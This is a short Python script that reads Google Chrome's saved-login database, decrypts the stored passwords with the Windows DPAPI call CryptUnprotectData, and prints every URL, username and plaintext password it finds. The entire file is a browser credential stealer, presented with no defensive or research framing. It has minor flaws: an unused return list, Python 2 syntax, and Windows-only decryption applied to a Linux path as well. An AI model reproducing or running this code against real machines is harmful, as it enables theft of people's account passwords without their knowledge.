import os
import sys
import sqlite3
import win32crypt


def getpath():
    if (os.name == "posix") and (sys.platform == "darwin"):
        sys.exit(0)
    elif os.name == "nt":
        path = os.getenv('localAppData') + '\\Google\\Chrome\\User Data\\Default\\'
    elif os.name == "posix":
        path = os.getenv('HOME') + '/.config/google-chrome/default'
    return path


def main():
    information_extracted = []
    path_to_file = getpath()
    print path_to_file
    conn = sqlite3.connect(path_to_file + "Login Data")
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')  #select only required details from the table
    data = cursor.fetchall()
    if len(data) > 0:
        for result in data:
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            print "URL: %s " \
                  "Username: %s " \
                  "Password: %s" % \
                  (result[0], result[1], password)
    return information_extracted


if __name__ == '__main__':
    main()
